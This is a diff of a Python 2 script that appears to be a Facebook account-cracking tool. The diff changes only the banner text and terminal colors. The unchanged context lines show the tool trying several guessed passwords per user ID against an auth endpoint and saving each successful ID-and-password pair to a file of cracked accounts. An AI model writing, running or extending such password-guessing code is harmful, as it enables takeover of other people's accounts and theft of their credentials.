@@ -466,7 +466,7 @@ def a_s():
     print ' \033[1;92mCrack Running\033[1;94m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\033[1;92mMUSKI Queen Of Facebook\033[1;94m'
+    print '\t\033[1;98mITZ XTYLISH PATHANI\033[1;94m'
     print 47 * '-'
     
     def main(arg):
@@ -477,7 +477,7 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass1
+                print '\033[1;92m[MUSKI-OK]➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -492,7 +492,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;92m[MUSKI-OK]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -507,7 +507,7 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;92m[MUSKI-OK]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
@@ -522,7 +522,7 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;92m[MUSKI-OK]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
